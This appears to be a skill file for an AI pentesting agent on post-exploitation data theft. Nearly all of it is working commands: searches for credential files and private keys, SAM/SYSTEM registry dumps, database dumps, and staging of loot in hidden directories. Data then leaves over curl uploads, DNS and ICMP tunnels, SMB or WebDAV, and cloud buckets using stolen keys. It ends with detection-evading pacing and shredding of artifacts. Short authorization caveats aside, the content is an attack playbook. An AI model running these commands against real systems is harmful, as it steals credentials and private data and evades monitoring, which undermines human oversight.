---
name: Data Exfiltration and Staging
description: Locate, collect, stage, compress/encrypt, and exfiltrate target data from a compromised host within RoE — sensitive-file hunts, DB/mail/share collection, tar/zip/7z + split/chunk staging, and channels (HTTPS POST, DNS tunnel, ICMP, SMB/WebDAV, cloud buckets, OAST) with detection-aware pacing. Proof is attacker-side receipt of the data.
tags: [exfiltration, staging, data-collection, dns-tunneling, oast, compression, encryption, opsec, post-exploitation]
recommended_tools: [execute_command, curl, tar, 7z, openssl, dnscat2, iodine, smbclient, rclone]
vuln_classes: []
domain: post-exploitation
phase: exfiltration
---

# Data Exfiltration and Staging

Goal: prove you can remove the target's data, not just touch it. Maps to MITRE **TA0009 (Collection)**
and **TA0010 (Exfiltration)**. Four phases in order: **collect** → **stage** → **channel** → **verify
+ clean**.

> **AUTHORIZATION**: only exfil data types the RoE names. Never touch PII/PHI/regulated data without
> written scope. When uncertain, prove exfil with a **canary file** you drop yourself — NOT real
> customer data. PROOF of exfil = file arrives intact on the attacker side (hash matches).

Decision order: **HTTPS out (already permitted) → DNS/ICMP covert → internal SMB/WebDAV/cloud**.
Try the loud channel first; covert only when the host is egress-locked and RoE permits it.

## Phase 1 — Collect (TA0009)

Never grab whole disks. Target by extension/name/owner.

### Linux — sensitive file hunt
```
find / \( -path /proc -o -path /sys -o -path /run \) -prune -o -type f \
  \( -name '*.kdbx' -o -name '*.pem' -o -name 'id_rsa*' -o -name '.env' \
     -o -name '*.sqlite*' -o -name 'wp-config.php' \
     -o -name '*.pfx' -o -name 'shadow' -o -name 'wallet.dat' \) \
  -readable -print 2>/dev/null                              # PROOF: paths returned

grep -RIl -E 'AKIA[0-9A-Z]{16}|-----BEGIN.*PRIVATE KEY|password\s*=' \
  /var/www /opt /etc 2>/dev/null                           # credential strings

mysqldump --all-databases -u <USER> -p<PASS> > /tmp/.s/db.sql
tar -cf /tmp/.s/mail.tar /var/mail /var/spool/mail 2>/dev/null
```

### Windows — sensitive file hunt
```
Get-ChildItem -Path C:\Users,C:\Inetpub,C:\ProgramData -Recurse -ErrorAction SilentlyContinue `
  -Include *.kdbx,*.pfx,*.pem,web.config,unattend.xml,*.rdp,*.pst,sitemanager.xml

findstr /S /I /M "password" C:\Users\*.xml C:\Users\*.ini 2>NUL

reg save HKLM\SAM   C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive           # PROOF: files written
```

### SMB / share scrape
```
smbclient //<TARGET>/<SHARE> -U <USER>%<PASS> -c 'recurse ON; prompt OFF; mget *'
netexec smb <TARGET> -u <USER> -p <PASS> --spider <SHARE> --pattern password
```

## Phase 2 — Stage (compress → split → encrypt)

Stage in a hidden scratch dir (`~/.cache/.<rand>` / `%TEMP%\<rand>`). Encrypt before it leaves.

### Linux
```
mkdir -p /tmp/.s
tar --exclude='*.iso' --exclude='node_modules' -cf - <PATHS> \
  | zstd -19 | openssl enc -aes-256-cbc -pbkdf2 -k <PASSPHRASE> \
  > /tmp/.s/loot.tar.zst.enc                             # PROOF: file created + hash

sha256sum /tmp/.s/loot.tar.zst.enc                       # note hash before sending

split -b 10M /tmp/.s/loot.tar.zst.enc /tmp/.s/chunk_   # chunk for DNS/ICMP channels
```

### Windows
```
7z a -t7z -mhe=on -p<PASSPHRASE> C:\Windows\Temp\loot.7z <PATHS>
certutil -hashfile C:\Windows\Temp\loot.7z SHA256         # note hash
```

## Phase 3 — Channel (choose by egress posture)

### 3a — HTTPS POST (default, use first)
```
# attacker: python3 -m http.server 443 --bind 0.0.0.0 (or SimpleHTTPServer with TLS)
curl -sk https://<ATTACKER>/upload -F "f=@/tmp/.s/loot.tar.zst.enc"   # Linux
Invoke-RestMethod -Uri https://<ATTACKER>/upload -Method Post \
  -InFile C:\Windows\Temp\loot.7z                                       # Windows
# PROOF: file appears on attacker server; hash matches
```

### 3b — DNS tunneling (locked-down hosts, no direct outbound HTTP)
```
# attacker: iodined -f -c -P <PASS> 10.53.53.1 <ATTACKER_DOMAIN>
# victim:   iodine -f -P <PASS> <ATTACKER_DNS_IP> <ATTACKER_DOMAIN>
# then SSH over the tun0 and scp the file
ssh -o StrictHostKeyChecking=no -p 22 root@10.53.53.1 \
  "cat > /exfil/loot.enc" < /tmp/.s/loot.tar.zst.enc

# OR dnscat2 (no root required on victim):
# attacker: ruby dnscat2.rb <ATTACKER_DOMAIN>
# victim:   ./dnscat <ATTACKER_DOMAIN>
dnscat --dns server=<ATTACKER_DNS>,domain=<ATTACKER_DOMAIN> \
  --exec "cat /tmp/.s/chunk_aa | xxd"                   # PROOF: data appears in dnscat session
```

### 3c — ICMP (very locked-down, only ICMP allowed out)
```
# attacker: icmptunnel -s (listen mode)
# victim:   icmptunnel <ATTACKER_IP>
# then carry any TCP traffic through the ICMP tunnel
```

### 3d — SMB/WebDAV (internal pivot — no direct internet)
```
# mount attacker SMB share (attacker runs impacket-smbserver):
smbclient //<ATTACKER>/<SHARE> -U anonymous -c "put /tmp/.s/loot.tar.zst.enc"
# WebDAV:
curl -T /tmp/.s/loot.tar.zst.enc http://<ATTACKER>:<PORT>/loot.enc
```

### 3e — Cloud storage (S3 / Azure blob / GCS — if outbound HTTPS to cloud allowed)
```
# use rclone pre-configured with stolen cloud creds (from Phase 1 collection)
rclone copy /tmp/.s/ <REMOTE>:<BUCKET>/exfil/ --progress
# OR raw AWS CLI with stolen IAM keys:
AWS_ACCESS_KEY_ID=<AK> AWS_SECRET_ACCESS_KEY=<SK> \
  aws s3 cp /tmp/.s/loot.tar.zst.enc s3://<BUCKET>/  # PROOF: object appears in bucket
```

### 3f — OAST / out-of-band (proof-only, tiny payloads)
```
# Confirm outbound connectivity + data extraction via DNS/HTTP callbacks:
curl "http://<OAST_HOST>/?h=$(hostname)&u=$(whoami)&f=$(ls /root|base64|tr -d '\n'|head -c200)"
nslookup $(cat /etc/passwd|md5sum|cut -c1-16).<OAST_DOMAIN>   # PROOF: DNS query arrives
```

## Phase 4 — Verify + Clean

### Verify on attacker side
```
sha256sum loot.tar.zst.enc     # must match hash noted in Phase 2
openssl enc -d -aes-256-cbc -pbkdf2 -k <PASSPHRASE> -in loot.tar.zst.enc \
  | zstd -d | tar -tf -        # list contents without fully extracting
```

### Clean staging artifacts (do BEFORE ending session)
```
# Linux
rm -rf /tmp/.s/
shred -u /tmp/.s/loot.tar.zst.enc  # if on a writable FS without journaling

# Windows
Remove-Item -Recurse -Force C:\Windows\Temp\loot.7z
sdelete64 -p 1 C:\Windows\Temp\sam.hive C:\Windows\Temp\sys.hive
```

## Detection-aware pacing

- **Rate-limit HTTPS**: `curl --limit-rate 500K` or split into chunks with sleep between.
- **Off-hours timing**: schedule transfers during maintenance windows if RoE allows.
- **Chunk size vs. channel**: DNS max ~100 bytes/query; ICMP ~1400 bytes/pkt; HTTPS unbounded.
- **Avoid writing to disk when possible**: pipe directly (`tar ... | curl --data-binary @- ...`).
- **Canary test first**: confirm the channel works with a tiny test file before the real payload.

## Real-world chains (0xdf HTB)

| Technique | Context | Command skeleton |
|-----------|---------|-----------------|
| SQLi → mysqldump → curl exfil | Web SQLi gives DB creds | `mysqldump -u <U> -p<P> <DB> \| curl -F f=@- https://<ATK>/` |
| /etc/shadow grab + crack | Root via SUID/sudo | `cat /etc/shadow > /tmp/.s/sh; curl -F f=@/tmp/.s/sh ...` |
| SAM/SYSTEM hive → secretsdump | Admin on Windows | `reg save HKLM\SAM ...; smbclient ... put sam.hive` |
| id_rsa harvest | ssh keys in /home | `find /home /root -name id_rsa 2>/dev/null \| xargs tar -cf - \| curl ...` |
| .env / wp-config chain | Web shell + config read | `cat wp-config.php \| curl -X POST -d @- https://<ATK>/` |
